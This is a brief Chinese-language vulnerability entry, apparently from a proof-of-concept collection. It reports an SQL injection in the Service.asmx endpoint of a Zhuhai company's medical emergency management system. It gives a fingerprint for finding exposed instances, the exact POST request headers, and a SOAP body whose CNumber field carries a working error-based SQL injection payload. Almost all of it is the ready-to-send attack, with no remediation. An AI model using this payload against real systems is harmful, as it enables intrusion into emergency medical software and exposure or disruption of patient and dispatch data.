# 珠海市安克电子技术有限公司医疗急救管理系统Service.asmx存在SQL注入漏洞

- **系统**：珠海市安克电子技术有限公司医疗急救管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"v6Cd4x0Px/YZrVqV3jQ3xQ=="`
- **请求**：`POST /api/Service.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml`　`Cookie: ASP.NET_SessionId=exrktu3aplxg004tcc2ntnuw; FailCount=5; ASPSESSIONIDSSDTSCDA=OL…`　`SOAPAction: [http://tempuri.org/GetAmbulance](http://tempuri.org/GetAmbulance)`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 494`

**请求体 / payload**
```
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
<soap:Header />
<soap:Body>
<tns:GetAmbulance>
<tns:CNumber>11' AND 6537 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6537=6537) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)))-- ntgj</tns:CNumber>
</tns:GetAmbulance>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—